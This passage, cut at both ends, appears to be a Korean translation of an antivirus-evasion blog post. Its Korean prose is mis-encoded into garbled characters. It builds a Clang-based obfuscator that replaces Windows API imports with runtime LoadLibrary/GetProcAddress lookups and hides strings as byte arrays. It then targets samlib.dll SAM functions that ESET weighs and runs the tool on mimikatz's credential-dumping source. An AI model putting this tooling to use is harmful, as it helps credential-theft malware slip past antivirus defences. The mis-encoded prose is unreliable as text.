œê³µí•˜ëŠ” ê²ƒì´ê³  ìµœì¢…ì ì¸ ëª©í‘œëŠ” ê° ìˆ˜ì •ëœ API í•¨ìˆ˜ì— <code>LoadLibrary/GetProcAddress</code>ë¥¼ ì‚½ì…í•˜ëŠ” ê²ƒì´ë¯€ë¡œ í•¨ìˆ˜ í”„ë¡œí† íƒ€ì…ê³¼ DLL ì´ë¦„ì„ ì œê³µí•´ì•¼ í•œë‹¤.</p><p>ê·¸ë ‡ê²Œ í•˜ë©´ ìˆ˜ì •í•  APIë§Œí¼ ë§ì€ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>ë¥¼ ë“±ë¡í•  ìˆ˜ ìˆë‹¤. ì´ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>ì˜ ì¸ìŠ¤í„´ìŠ¤í™”ëŠ” <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>ì—ì„œ ìˆ˜í–‰ë˜ì•¼ë§Œ í•œë‹¤:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>ì˜ ì£¼ìš” ë³€ê²½ì .</p><p>ì´ê²ƒì€ ì´ì „ ê¸€ì—ì„œ ì‘ì—…í•œ ê¸°ì¡´ ì½”ë“œì— ëŒ€í•œ ìœ ì¼í•œ ë³€ê²½ì ì´ë‹¤. ìš°ë¦¬ê°€ ì¶”ê°€í•  ì½”ë“œë“¤ì€ <code>ApiMatchHandelr.cpp</code>ë¥¼ ë§Œë“œëŠ” ê²ƒë¶€í„° ì‹œì‘í•œë‹¤.</p><p>matcherëŠ” ì½œë°± í•¨ìˆ˜ì™€ í•¨ê»˜ ì œê³µë˜ë¯€ë¡œ ë‹¤ìŒ í•˜ë‚˜ë¥¼ ì œê³µí•˜ì.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>ì„¹ì…˜ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ë¦¬ìŠ¤íŠ¸ë¡œ ë¶„ë¦¬ëœ ì‘ì—…ë“¤ì€ ì•„ë˜ ë©”ì†Œë“œë¥¼ í†µí•´ ì½”ë“œë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="í•¨ìˆ˜-í˜¸ì¶œ-ëŒ€ì²´"><a href="#í•¨ìˆ˜-í˜¸ì¶œ-ëŒ€ì²´" class="headerlink" title="í•¨ìˆ˜ í˜¸ì¶œ ëŒ€ì²´"></a>í•¨ìˆ˜ í˜¸ì¶œ ëŒ€ì²´</h3><p>ì´ê²ƒì€ ê°€ì¥ ì‚¬ì†Œí•œ ë¶€ë¶„ì´ë‹¤. ëª©í‘œëŠ” ASTì˜ <code>MessageBoxA</code>ë¥¼ ë¬´ì‘ìœ„ ì‹ë³„ìë¡œ ëŒ€ì²´í•˜ëŠ” ê²ƒì´ë‹¤. ì´ëŸ¬í•œ ë¬´ì‘ìœ„ ë³€ìˆ˜ ì´ˆê¸°í™”ëŠ” ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ìˆ˜í–‰ëœë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn APIëŠ” í•¨ìˆ˜ ì‹ë³„ìì˜ ì´ë¦„ì„ ë³€ê²½í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-ì‚½ì…"><a href="#LoadLibrary-GetProcAddress-ì‚½ì…" class="headerlink" title="LoadLibrary/GetProcAddress ì‚½ì…"></a>LoadLibrary/GetProcAddress ì‚½ì…</h3><p>ìš°ë¦¬ê°€ ì¶”ê°€í•˜ê³ ì í•˜ëŠ” APIì— Run-time dynamic linkingì„ ì¶”ê°€í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ë‹¤:</p><ul><li><p>translation unitì˜ ìƒë‹¨ í˜¹ì€ enclosing í•¨ìˆ˜ ì•ˆì— API í”„ë¡œí† íƒ€ì…ì„ ì¶”ê°€í•´ë¼. ì‰½ê²Œ í•˜ê¸° ìœ„í•´ ìš°ë¦¬ëŠ” í›„ìë¥¼ ì„ íƒí•˜ì§€ë§Œ ë™ì¼í•œ í•¨ìˆ˜ì—ì„œ APIë¥¼ ì—¬ëŸ¬ ë²ˆ í˜¸ì¶œí•  ê²½ìš° ì´ë¯¸ ì¶”ê°€ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  í•„ìš”ê°€ ìˆë‹¤.</p></li><li><p>ì•„ë˜ ë¼ì¸ì„ ì¶”ê°€í•´ë¼</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> í˜¸ì¶œì„ ì¶”ê°€í•´ë¼</p></li></ul><p>ë¬¼ë¡  ì´ ì‘ì—…ì„ í•˜ë©´ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì‚½ì…í•˜ì§€ ì•Šê¸° ìœ„í•´ ê° ë¬¸ìì—´ì„ ìŠ¤íƒ ë¬¸ìì—´ë¡œ ì‘ì„±í•´ì•¼ í•œë‹¤. ì´ê²ƒì€ ì½”ë“œë¥¼ ì½ê¸° ì§€ë£¨í•˜ê²Œ ë§Œë“¤ì§€ë§Œ ë³µì¡í•˜ì§„ ì•Šë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>ì „ë¶€ ì˜ ë™ì‘í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì•„ë˜ í…ŒìŠ¤íŠ¸ íŒŒì¼ì„ ì‚¬ìš©í•˜ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator ì‹¤í–‰!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>ê²°ê³¼ í™•ì¸!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ë³¼ ìˆ˜ ìˆë“¯ì´ ë¬¸ìì—´ ë‚œë…í™”ì™€ API ë‚œë…í™” íŒ¨ìŠ¤ì˜ ì¡°í•©ì€ ìƒë‹¹íˆ ê°•ë ¥í•˜ë‹¤. <code>Test</code> ë¬¸ìì—´ì€ ì‘ì€ ë¬¸ìì—´ì€ ë¬´ì‹œí•˜ëŠ” ê²ƒìœ¼ë¡œ ê²°ì •í–ˆê¸° ë•Œë¬¸ì— ë‚¨ì•„ìˆë‹¤. ê·¸ í›„ ë‚œë…í™” ì†ŒìŠ¤ ì½”ë“œëŠ” ë¹Œë“œí•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>ìœˆë„ìš°10 ê°€ìƒ ë¨¸ì‹ ì—ì„œ í…ŒìŠ¤íŠ¸ ê²°ê³¼ ì›ë˜ ê¸°ëŠ¥ì´ ê³„ì† ì‘ë™í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. ë” ì¤‘ìš”í•œ ê²ƒì€ ë‚œë…í™”ëœ ë°”ì´ë„ˆë¦¬ì— <code>MessageBox</code> ë¬¸ìì—´ì´ ì—†ë‹¤.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ESET Nod32 ê´€ë ¨í•´ì„œ ìš°ë¦¬ëŠ” <code>samlib.dll</code>ê³¼ ê´€ë ¨ëœ API imports ì¤‘ íŠ¹íˆ ì•„ë˜ì— ìˆëŠ” APIë“¤ì„ ìˆ¨ê¸°ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆë‹¤.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì€ AV ì—”ì§„ ì–´ë””ì—ì„œë„ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ìˆì§€ ì•Šì§€ë§Œ ë‚´ë¶€ íƒì§€ ì‹ ë¢° ì ìˆ˜ë¥¼ ë†’ì¸ë‹¤. ì´ëŸ¬í•œ í•¨ìˆ˜ì— <code>ApiCallConsumer</code>ë¥¼ ë“±ë¡í•´ì•¼ í•˜ë¯€ë¡œ ì´ë¦„ê³¼ í•¨ìˆ˜ í”„ë¡œí† íƒ€ì…ì´ í•„ìš”í•˜ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>ê·¸ í›„ ì´ëŸ¬í•œ ì»¬ë ‰ì…˜ì„ ë°˜ë³µí•˜ê³  ê° ì»¬ë ‰ì…˜ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ <code>main.cpp</code>ë¥¼ ì—…ë°ì´íŠ¸í•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>ì—¬ê¸°ì„œ <code>std::make_unique</code>ëŠ” ì´ ë°˜ë³µë¬¸ì—ì„œ í™ì— ìˆëŠ” ê°ì²´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™”í•  ìˆ˜ ìˆê¸°ì— ì¤‘ìš”í•˜ê³  ë‚˜ì¤‘ì— ì´ëŸ¬í•œ ê°ì²´ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì‰½ê²Œ í•´ì œí•  ìˆ˜ ìˆë‹¤. ì´ê²ƒì€ ë” ì´ìƒ ì‚¬ìš©í•˜ì§€ ì•Šì„ ë•Œ ìë™ìœ¼ë¡œ í•´ì œë  ê²ƒì´ë‹¤.</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ mimikatz, íŠ¹íˆ <code>kuhl_m_lsadump.c</code>ë¡œ ë‚œë…í™”ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>ì´ê²ƒì€ í¥ë¯¸ë¡œìš´ ê²°ê³¼ë¥¼ ë§Œë“ ë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>ì—ì„œ ê°€ì ¸ì˜¨ APIë¥¼ ìœ„í•œ Run-time dynamic linking</p><p>ì‹¤ì œ í•¨ìˆ˜ 